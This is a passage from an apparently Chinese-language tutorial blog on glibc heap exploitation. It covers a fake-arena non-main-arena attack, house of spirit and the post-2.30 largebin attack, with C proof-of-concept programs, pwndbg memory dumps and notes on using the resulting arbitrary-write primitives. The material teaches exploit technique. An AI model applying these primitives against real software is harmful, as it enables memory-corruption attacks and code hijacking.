offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size. </span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself. </span></span><br><span class="line"><span class="comment">	In 2.31, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an </span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x30 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs. </span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28. </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以分配任意大小的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要利用的是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure>

<p>如果是 <code>non-mainarean</code> 的 <code>chunk</code>，会根据其地址找到 <code>heapinfo</code>，然后找到 <code>malloc_state</code> 结构体。</p>
<p>因此，利用技巧是：</p>
<ul>
<li>根据要释放的 <code>fastbin chunk A</code> 的堆地址，找到对应的 <code>heap_for_ptr</code> 地址</li>
<li>在 <code>heapinfo</code> 地址处伪造好相关变量，重点是 <code>mstate</code> 指针</li>
<li>修改 <code>chunk A</code> 的 <code>non-main</code> 标志位，释放到伪造的 <code>arena</code> 里面，控制好偏移即可</li>
</ul>
<h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li>
<li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li>
<li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li>
</ul>
<h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址写堆地址</li>
</ul>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>效果：劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates the house of spirit attack.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Required primitives: known target address, ability to set up the start/end of the target memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 1: Allocate 7 chunks and free them to fill up tcache&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 2: Prepare the fake chunk&quot;</span>);</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The target fake chunk is at %p\n&quot;</span>, fake_chunks);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n&quot;</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 3: Free the first fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Note that the address of the fake chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 4: Take out the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next calloc will return our fake chunk at %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc can do the trick as well, you just need to do it for 8 times.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *allocated = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p, fake chunk: %p\n&quot;</span>, allocated, victim);</span><br><span class="line"></span><br><span class="line">	assert(allocated == victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p>
<h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li>
<li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li>
<li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li>
</ul>
<h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p>
<h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li>
</ul>
<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h2><p>效果：对任意地址写入一个堆地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet (有关代码片段):</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced(zhi&#x27;x) on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新版largebin_attack利用的源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">					  <span class="comment">//将victim链入nextsize链表</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//设置 victim 的 fd_nextsize，为p2 headptr</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      <span class="comment">//设置 victim 的bk_nextsize，为p2 headptr</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      <span class="comment">//设置 p1 的fd_nextsize 和 bk_nextsize</span></span><br><span class="line">					  <span class="comment">/*引用到原代码中，示例如下：*/</span></span><br><span class="line">                      &amp;p2-&gt;fd_nextsize = &amp;p1-&gt;fd;</span><br><span class="line">                      &amp;p2-&gt;bk_nextsize = &amp;p1-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      &amp;p1-&gt;fd-&gt;bk_nextsize = &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize = &amp;p2;</span><br></pre></td></tr></table></figure>


<p>首先是程序申请了4个堆块分别为0x428、0x18、0x418、0x18</p>
<p>申请的g1和g2是为了防止两个比较大的堆块合并.</p>
<p>再往后释放了p1堆块，到unsorted bin中</p>
<p>之后有分配了一个比p1大的堆块使得p1堆块能够进入largebin中</p>
<p>改 p1-&gt;bk_nextsize 为target-0x20</p>
<p>然后程序free p2堆块进入到unsorted bin中</p>
<p><strong>此时就造成了unsortedbin中有一个largebinchunk，再次分配一个比bins中都大的chunk时p2会被放入largebin，触发漏洞</strong><br><strong>调试：</strong></p>
<p><code>&amp;target = 0x7fffffffe470</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7fbbfd0 (main_arena+1104) ◂— 0x555555559290</span><br><span class="line">pwndbg&gt; x/10gx 0x5555555596e0 <span class="comment"># p2</span></span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290 <span class="comment"># p1</span></span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;后 p2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;后 p2</p>
<blockquote>
<p>这里可以注意到：fwd-&gt;fd 是 0x0000555555559290，即fwd是p1的mem指针，victim是p2的head指针</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过&amp;p1-&gt;fd-&gt;bk_nextsize &#x3D; &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; &p2;后target就被写入了 p2 的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00005555555596e0</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7fffffffe470-0x20</span><br><span class="line">0x7fffffffe450: 0x0000555555555610      0x00007fffffffe4b0</span><br><span class="line">0x7fffffffe460: 0x0000555555555140      0x00005555555554e7</span><br><span class="line">0x7fffffffe470: 0x00005555555596e0&lt;--target     0x00005555555592a0</span><br><span class="line">0x7fffffffe480: 0x00005555555596d0      0x00005555555596f0</span><br><span class="line">0x7fffffffe490: 0x0000555555559b10      0x0000555555559b30</span><br></pre></td></tr></table></figure>

<p>其实，这三行置零最重要的是最后一行的<code>(target-0x20)-&gt;fd_nextsize = victim</code>这就相当于在(target-0x20)+0x20也就是target的地方写下victim也就是p2的地址</p>
<p><strong>利用：</strong></p>
<p>这种写大数的行为，我们可以用来修改global_max_fast,来使程序中分配的堆块都被识别成fastbin，这样来进行一些可以实现的fastbin attack。再恶劣一点的环境来说，我们可以利用其来进行指针的劫持，劫持为我们可控的地方，在可控的地方为造出原本应有的结构体产生劫持程序流的效果（iofile_attack:你直接说我名字得了）。</p>
